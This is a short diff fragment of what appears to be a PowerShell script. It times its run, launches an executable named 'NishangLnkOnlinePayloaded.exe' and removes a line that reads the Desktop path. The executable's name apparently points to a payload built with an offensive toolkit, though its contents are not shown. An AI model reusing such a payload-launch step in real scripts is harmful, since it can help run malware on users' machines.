@@ -10,4 +10,3 @@ Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
 
 Start-Process -FilePath "NishangLnkOnlinePayloaded.exe"
 
-$DesktopPath = [Environment]::GetFolderPath('Desktop');
